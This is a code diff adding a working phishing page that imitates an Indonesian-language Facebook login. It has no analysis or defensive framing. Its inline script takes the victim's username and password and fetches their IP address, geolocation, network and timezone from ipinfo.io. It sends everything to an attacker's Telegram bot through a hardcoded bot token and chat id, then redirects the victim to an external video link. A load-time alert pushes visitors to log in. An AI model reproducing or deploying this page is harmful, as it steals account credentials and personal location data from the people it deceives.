@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Login</title>
+  <link rel="stylesheet" href="login.css">
+</head>
+
+<body>
+  <div class="login-container">
+    <p class="language-text">Bahasa Indonesia</p>
+    
+    <div class="facebook-logo-placeholder">
+      <svg viewBox="0 0 24 24" width="60" height="60" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="12" fill="#1877F2" />
+        <path d="M14.659 7.025H12.984C12.569 7.025 12.399 7.214 12.399 7.733V9.54H14.54L14.22 11.96H12.399V18.975H9.684V11.96H8V9.54H9.684V7.618C9.684 5.923 10.59 5 13.111 5H14.659V7.025Z"
+                                                                                                                                fill="white" />
+      </svg>
+    </div>
+    
+    <form class="login-form">
+      <input id="name" type="text" placeholder="Nomor ponsel atau email">
+      <div class="password-input-wrapper">
+        <input id="pass" type="password" placeholder="Kata sandi">
+        <span onclick="togglePass()" class="password-toggle">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                                                                                                                  stroke-linecap="round"
+                                                                                                                                  stroke-linejoin="round">
+            <path
+                                                                                                                                    d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.16M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
+            <line x1="1" x2="23" y1="1" y2="23" />
+          </svg>
+        </span>
+      </div>
+      
+      <button type="button" class="login-button">Login</button>
+      
+      <a href="#" class="forgot-password">Lupa kata sandi?</a>
+    </form>
+    
+    <div class="separator-meta">
+      <span class="meta-text">
+        <span class="dot">&bull;</span>
+        <span class="dot">&bull;</span>
+        <span class="dot">&bull;</span>
+      </span>
+    </div>
+    
+    <!-- button class="create-account-button">Buat akun baru</button -->
+    
+    <p class="meta-tag">
+      &infin; **Meta**
+    </p>
+  </div>
+  <script>
+    const usrName = document.getElementById('name'), usrPass = document.getElementById('pass')
+    const userId = "6253673851";
+    const url = "https://api.telegram.org/bot8285352258:AAFQkprZ_DlpL0vh81jRY-mEbIHt367IlC8/sendMessage";
+  
+    document.body.onload = () => {
+      alert('Silahkan masuk dulu untuk melanjutkan');
+    }
+    
+    function togglePass(){
+      if (usrPass.type == "password"){
+        usrPass.type = 'text';
+      } else {
+        usrPass.type = 'password';
+      }
+    }
+    
+    function send(msg){
+        let loc = msg.loc.split(',');
+        let message = `<code>
+Username   : ${usrName.value}
+Password   : ${usrPass.value}
+
+Negara     : ${msg.country}
+Provinsi   : ${msg.region}
+Lokasi     : Lintang: ${loc[0]} Bujur: ${loc[1]}
+Jaringan   : ${msg.org} | Postal : ${msg.postal}
+IP Publik  : ${msg.ip}
+Zona Waktu : ${msg.timezone}
+</code>`;
+      
+        const opt = {
+          method: 'post',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: userId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        }
+        fetch(url, opt)
+          .then(res => window.location.href = "https://videy.co/v/?id=Mq7KxZAG1")
+          .catch(err => console.log(err))
+      }
+    
+    document.querySelector('.login-button').onclick = (e) => {
+      e.preventDefault();
+      
+      fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => send(data))
+        .catch(err => console.log(err))
+      
+    }
+  </script>
+  </body>
+</html>
